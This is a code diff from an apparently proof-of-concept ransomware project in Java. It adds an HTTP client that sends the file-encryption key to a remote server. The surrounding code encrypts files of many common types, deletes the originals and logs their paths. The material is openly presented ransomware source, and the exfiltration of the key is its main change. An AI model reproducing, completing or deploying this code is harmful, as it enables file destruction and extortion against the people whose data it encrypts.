@@ -15,9 +15,11 @@ public class UtilsDriver {
             "7z", "pkg", "tar", "tar.gz", "rar", "z", "json", "js", "html", "log", "sav", "xml", "docx", "bat", "py",
             "psd", "tif", "tiff" };
     private static String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
-    private static File encryptedFileList = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
+    private static File encryptedFileList = new File(
+            "D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
+        HTTPClient Client = new HTTPClient();
 
         String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";
 
@@ -54,9 +56,18 @@ public class UtilsDriver {
                 fileArray.remove(file);
             }
         }
-        //File tempFile1 = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AK.jpg.encrypted");
-        //File tempDec1 = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AKDECRYPTED.jpg");
-        //decryptFile("Zx![#X:Lcun%^beuVc3S7k130_^&C)@A", tempFile1, tempDec1);
+        // File tempFile1 = new
+        // File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AK.jpg.encrypted");
+        // File tempDec1 = new
+        // File("D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/AKDECRYPTED.jpg");
+        // decryptFile(key, tempFile1, tempDec1);
+
+        try {
+            Client.saveKey(key);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
         key = ""; // Remove key from memory
     }
 
@@ -64,7 +75,8 @@ public class UtilsDriver {
         File encryptedFile = new File(folderPath + inputFile.getName() + ".encrypted");
         encryptFile(key, inputFile, encryptedFile);
         inputFile.delete();
-        FileUtils.writeStringToFile(encryptedFileList, inputFile.getAbsolutePath() + "\n", StandardCharsets.UTF_8.name(), true);
+        FileUtils.writeStringToFile(encryptedFileList, inputFile.getAbsolutePath() + "\n",
+                StandardCharsets.UTF_8.name(), true);
         System.out.println("Encrypted and deleted file: " + inputFile.getName());
     }
 
